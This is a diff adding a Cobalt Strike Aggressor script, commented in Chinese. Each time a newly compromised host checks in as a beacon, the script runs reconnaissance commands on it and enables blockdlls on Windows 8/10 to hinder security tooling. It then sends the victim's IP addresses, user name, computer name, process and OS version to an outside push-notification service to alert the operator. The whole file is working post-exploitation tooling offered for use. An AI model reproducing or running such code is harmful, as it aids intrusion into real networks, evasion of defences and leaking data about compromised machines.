@@ -1,0 +1,55 @@
+# 循环获取所有beacon
+on beacon_initial {
+
+	# 上线执行
+	bshell($1, "netstat -nao");
+	bshell($1, "arp -a");
+	bshell($1, "whoami");
+	bshell($1, "ipconfig");
+	bshell($1, "systeminfo");
+
+	sub http_get {
+		local('$output');
+		$url = [new java.net.URL: $1];
+		$stream = [$url openStream];
+		$handle = [SleepUtils getIOHandle: $stream, $null];
+
+		@content = readAll($handle);
+
+		foreach $line (@content) {
+			$output .= $line . "\r\n";
+		}
+		
+		println($output);
+	}
+	#获取ip、计算机名、登录账号
+	$internalIP = replace(beacon_info($1, "internal"), " ", "_");
+	$userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+	$externalIP = replace(beacon_info($1, "external"), " ", "_");
+	$process = replace(beacon_info($1, "process"), " ", "_");
+
+	# 获得服务器版本
+	$ver = beacon_info($1, 'ver');
+	#$ver = iff($ver eq "6.2", "windows:8/10", $ver);
+	$ver = iff($ver eq "6.0", "windows:7/vista", $ver);
+	$ver = iff($ver eq "6.1", "windows:7/vista", $ver);
+	$ver = iff($ver eq "5.1", "windows:xp/2003", $ver);
+	if ($ver eq "6.2"){
+	$ver = "windows:8/10";
+	binput($1, "blockdlls start");
+	bblockdlls($1, true);
+	}
+	if ($ver eq "10.0") {
+	$ver = "windows:10";
+	binput($1, "blockdlls start");
+	bblockdlls($1, true);
+	}
+	
+	$arch = beacon_info($1, 'arch');
+	#get一下Server酱的链接
+	$url = 'https://sctapi.ftqq.com/xxx.send?text=CS%E4%B8%8A%E7%BA%BF%E6%8F%90%E9%86%92&desp='.localip().'%0A%0D%0A%e5%a4%96%e7%bd%91ip:'.$externalIP.'%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName.'%0D%0A%0D%0Aprocess%3A'.$process.'%0D%0A%0D%0A'.$ver.':'.$arch;
+	
+	http_get($url);
+	
+}
